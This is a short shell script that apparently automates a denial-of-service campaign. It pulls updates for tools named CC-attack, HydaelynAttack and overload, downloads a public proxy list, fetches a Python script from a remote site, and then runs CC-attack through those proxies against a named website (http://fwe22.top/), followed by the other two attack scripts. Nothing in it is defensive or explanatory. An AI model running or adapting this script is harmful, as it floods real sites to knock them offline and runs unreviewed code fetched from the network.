echo "updata Nyaa-Automata"
git pull

echo ""
echo "updata proxy"
curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt

echo ""
echo "updata HydaelynAttack"
cd HydaelynAttack
git pull
cd ..

echo ""
echo "updata CC-attack"
cd CC-attack
git pull
cd ..

echo ""
echo "updata overload"
cd overload
git pull
curl https://nyaacaster.github.io/Nyaa-Automata/overload_p.py -o overload/overload_p.py
cd ..

echo ""
echo "CC-attack"
python3 CC-attack/cc.py -url http://fwe22.top/ -f proxy.txt -v 5 -s 30

echo ""
echo "HydaelynAttack"
python3 HydaelynAttack/HydaelynAttack_p_once_noLog.py

echo ""
echo "overload"
python3 overload/overload_p.py
